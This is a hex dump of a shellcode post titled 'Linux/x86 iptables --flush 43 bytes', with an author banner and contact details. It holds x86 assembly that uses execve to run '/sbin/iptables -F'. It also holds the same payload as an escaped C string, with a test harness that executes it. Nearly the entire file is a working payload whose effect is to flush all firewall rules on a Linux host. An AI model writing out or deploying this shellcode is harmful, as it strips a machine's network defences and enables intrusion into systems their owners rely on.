00000000  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000030  2a 2a 2a 2a 2a 0d 0a 20  20 20 20 2a 20 20 20 20  |*****..    *    |
00000040  4c 69 6e 75 78 2f 78 38  36 20 69 70 74 61 62 6c  |Linux/x86 iptabl|
00000050  65 73 20 2d 2d 66 6c 75  73 68 20 34 33 20 62 79  |es --flush 43 by|
00000060  74 65 73 20 09 20 20 20  20 20 20 20 20 2a 0d 0a  |tes .        *..|
00000070  20 20 20 20 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |    ************|
00000080  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000000a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 0d 0a 20 20 20 20 2a  |*********..    *|
000000b0  09 20 20 09 20 20 41 75  74 68 6f 72 3a 20 48 61  |.  .  Author: Ha|
000000c0  6d 7a 61 20 4d 65 67 61  68 65 64 09 09 20 20 20  |mza Megahed..   |
000000d0  20 20 20 20 20 2a 0d 0a  20 20 20 20 2a 2a 2a 2a  |     *..    ****|
000000e0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000110  2a 0d 0a 20 20 20 20 2a  20 20 20 20 20 20 20 20  |*..    *        |
00000120  20 20 20 20 20 54 77 69  74 74 65 72 3a 20 40 48  |     Twitter: @H|
00000130  61 6d 7a 61 5f 4d 65 67  61 20 20 20 20 20 20 20  |amza_Mega       |
00000140  20 20 20 20 20 20 20 20  20 20 20 2a 0d 0a 20 20  |           *..  |
00000150  20 20 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |  **************|
00000160  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000180  2a 2a 2a 2a 2a 2a 2a 0d  0a 20 20 20 20 2a 20 20  |*******..    *  |
00000190  20 20 20 62 6c 6f 67 3a  20 68 61 6d 7a 61 2d 6d  |   blog: hamza-m|
000001a0  65 67 61 5b 64 6f 74 5d  62 6c 6f 67 73 70 6f 74  |ega[dot]blogspot|
000001b0  5b 64 6f 74 5d 63 6f 6d  20 20 20 20 20 20 20 20  |[dot]com        |
000001c0  20 2a 0d 0a 20 20 20 20  2a 2a 2a 2a 2a 2a 2a 2a  | *..    ********|
000001d0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000001f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 0d 0a 20  |*************.. |
00000200  20 20 20 2a 20 20 20 45  2d 6d 61 69 6c 3a 20 68  |   *   E-mail: h|
00000210  61 6d 7a 61 5b 64 6f 74  5d 6d 65 67 61 68 65 64  |amza[dot]megahed|
00000220  5b 61 74 5d 67 6d 61 69  6c 5b 64 6f 74 5d 63 6f  |[at]gmail[dot]co|
00000230  6d 20 20 20 20 20 20 2a  0d 0a 20 20 20 20 2a 2a  |m      *..    **|
00000240  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000270  2a 2a 2a 0d 0a 0d 0a 78  6f 72 20 20 20 20 25 65  |***....xor    %e|
00000280  61 78 2c 25 65 61 78 0d  0a 70 75 73 68 20 20 20  |ax,%eax..push   |
00000290  25 65 61 78 0d 0a 70 75  73 68 77 20 20 24 30 78  |%eax..pushw  $0x|
000002a0  34 36 32 64 0d 0a 6d 6f  76 6c 20 20 20 25 65 73  |462d..movl   %es|
000002b0  70 2c 25 65 73 69 0d 0a  70 75 73 68 6c 20 20 25  |p,%esi..pushl  %|
000002c0  65 61 78 0d 0a 70 75 73  68 6c 20 20 24 30 78 37  |eax..pushl  $0x7|
000002d0  33 36 35 36 63 36 32 0d  0a 70 75 73 68 6c 20 20  |3656c62..pushl  |
000002e0  24 30 78 36 31 37 34 37  30 36 39 0d 0a 70 75 73  |$0x61747069..pus|
000002f0  68 6c 20 20 24 30 78 32  66 36 65 36 39 36 32 0d  |hl  $0x2f6e6962.|
00000300  0a 70 75 73 68 6c 20 20  24 30 78 37 33 32 66 32  |.pushl  $0x732f2|
00000310  66 32 66 0d 0a 6d 6f 76  20 20 20 20 25 65 73 70  |f2f..mov    %esp|
00000320  2c 25 65 62 78 0d 0a 70  75 73 68 6c 20 20 25 65  |,%ebx..pushl  %e|
00000330  61 78 0d 0a 70 75 73 68  6c 20 20 25 65 73 69 0d  |ax..pushl  %esi.|
00000340  0a 70 75 73 68 6c 20 20  25 65 62 78 0d 0a 6d 6f  |.pushl  %ebx..mo|
00000350  76 6c 20 20 20 25 65 73  70 2c 25 65 63 78 0d 0a  |vl   %esp,%ecx..|
00000360  6d 6f 76 20 20 20 20 25  65 61 78 2c 25 65 64 78  |mov    %eax,%edx|
00000370  0d 0a 6d 6f 76 20 20 20  20 24 30 78 62 2c 25 61  |..mov    $0xb,%a|
00000380  6c 0d 0a 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |l..int    $0x80.|
00000390  0a 0d 0a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |...*************|
000003a0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
000003b0  2a 2a 2a 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |***..#include <s|
000003c0  74 64 69 6f 2e 68 3e 0d  0a 23 69 6e 63 6c 75 64  |tdio.h>..#includ|
000003d0  65 20 3c 73 74 72 69 6e  67 2e 68 3e 0d 0a 20 0d  |e <string.h>.. .|
000003e0  0a 63 68 61 72 20 2a 73  68 65 6c 6c 63 6f 64 65  |.char *shellcode|
000003f0  20 3d 20 22 5c 78 33 31  5c 78 63 30 5c 78 35 30  | = "\x31\xc0\x50|
00000400  5c 78 36 36 5c 78 36 38  5c 78 32 64 5c 78 34 36  |\x66\x68\x2d\x46|
00000410  5c 78 38 39 5c 78 65 36  5c 78 35 30 5c 78 36 38  |\x89\xe6\x50\x68|
00000420  5c 78 36 32 5c 78 36 63  5c 78 36 35 5c 78 37 33  |\x62\x6c\x65\x73|
00000430  22 0d 0a 09 09 20 20 22  5c 78 36 38 5c 78 36 39  |"....  "\x68\x69|
00000440  5c 78 37 30 5c 78 37 34  5c 78 36 31 5c 78 36 38  |\x70\x74\x61\x68|
00000450  5c 78 36 32 5c 78 36 39  5c 78 36 65 5c 78 32 66  |\x62\x69\x6e\x2f|
00000460  5c 78 36 38 5c 78 32 66  5c 78 32 66 5c 78 32 66  |\x68\x2f\x2f\x2f|
00000470  22 0d 0a 09 09 20 20 22  5c 78 37 33 5c 78 38 39  |"....  "\x73\x89|
00000480  5c 78 65 33 5c 78 35 30  5c 78 35 36 5c 78 35 33  |\xe3\x50\x56\x53|
00000490  5c 78 38 39 5c 78 65 31  5c 78 38 39 5c 78 63 32  |\x89\xe1\x89\xc2|
000004a0  5c 78 62 30 5c 78 30 62  5c 78 63 64 5c 78 38 30  |\xb0\x0b\xcd\x80|
000004b0  22 3b 0d 0a 0d 0a 20 0d  0a 69 6e 74 20 6d 61 69  |";.... ..int mai|
000004c0  6e 28 76 6f 69 64 29 0d  0a 7b 0d 0a 66 70 72 69  |n(void)..{..fpri|
000004d0  6e 74 66 28 73 74 64 6f  75 74 2c 22 4c 65 6e 67  |ntf(stdout,"Leng|
000004e0  74 68 3a 20 25 64 5c 6e  22 2c 73 74 72 6c 65 6e  |th: %d\n",strlen|
000004f0  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0d 0a 28  |(shellcode));..(|
00000500  2a 28 76 6f 69 64 28 2a  29 28 29 29 20 73 68 65  |*(void(*)()) she|
00000510  6c 6c 63 6f 64 65 29 28  29 3b 0d 0a 72 65 74 75  |llcode)();..retu|
00000520  72 6e 20 30 3b 0d 0a 7d                           |rn 0;..}|
00000528
